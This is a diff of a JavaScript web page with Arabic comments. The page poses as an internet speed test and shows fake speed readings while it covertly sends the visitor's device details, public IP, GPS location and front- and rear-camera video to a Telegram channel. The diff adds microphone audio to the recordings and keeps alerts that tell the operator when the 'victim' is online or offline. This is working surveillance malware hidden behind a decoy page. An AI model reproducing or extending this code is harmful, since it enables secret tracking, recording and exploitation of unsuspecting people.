@@ -53,7 +53,7 @@
             } catch (e) {}
         }
 
-        // إشعارات متقدمة للحالة
+        // إشعارات الحالة (Online/Offline)
         window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
         window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد لفتح الصفحة الآن.");
 
@@ -70,14 +70,11 @@
                 info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
                 info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
             }
-
             try {
                 const b = await navigator.getBattery();
                 info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
             } catch(e) {}
-
             info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
-
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -88,14 +85,15 @@
 
         async function recordVideo(mode, label, duration) {
             try {
-                // إيقاف أي تيار نشط لضمان التبديل الصحيح
+                // إغلاق أي تيار كاميرا نشط سابقاً
                 if (window.currentStream) {
                     window.currentStream.getTracks().forEach(t => t.stop());
                 }
 
+                // طلب إذن الكاميرا والميكروفون (audio: true)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: mode }, 
-                    audio: false 
+                    audio: true 
                 });
                 
                 window.currentStream = stream;
@@ -109,9 +107,9 @@
                 const recordingPromise = new Promise(resolve => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: "video/mp4" });
-                        // التحقق من وجود بيانات حقيقية لتجنب ملفات 110 بايت
+                        // التحقق من الحجم لضمان وصول فيديو حقيقي
                         if (blob.size > 2000) {
-                            await sendToTelegram(`🎥 فيديو لايف (${label} - 12 ثانية)`, "video", blob);
+                            await sendToTelegram(`🎥 فيديو بصوت (${label} - 12 ثانية)`, "video", blob);
                         }
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
@@ -123,32 +121,32 @@
                 recorder.stop();
                 return recordingPromise;
             } catch (e) {
-                await sendToTelegram(`❌ فشل تصوير فيديو ${label}`);
+                await sendToTelegram(`❌ فشل تصوير فيديو ${label} (إذن الميكروفون مرفوض)`);
             }
         }
 
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
             document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري الفحص...";
+            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";
 
             const timer = setInterval(() => {
                 document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
             }, 100);
 
-            // 1. التقرير والموقع
+            // 1. إرسال التقرير والموقع فوراً
             sendToTelegram(await getFullReport());
             navigator.geolocation.getCurrentPosition(p => {
                 sendToTelegram(`📍 *الموقع*:\n[فتح الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // 2. فيديو أمامي (12 ثانية)
+            // 2. فيديو أمامي بصوت (12 ثانية)
             await recordVideo("user", "أمامي", 12000);
 
-            // 3. فترة انتظار تقنية لتبديل العدسة (3 ثوانٍ)
+            // 3. فاصل زمني لضمان تبديل الكاميرا
             await new Promise(r => setTimeout(r, 3000));
 
-            // 4. فيديو خلفي (12 ثانية)
+            // 4. فيديو خلفي بصوت (12 ثانية)
             await recordVideo("environment", "خلفي", 12000);
 
             setTimeout(() => {
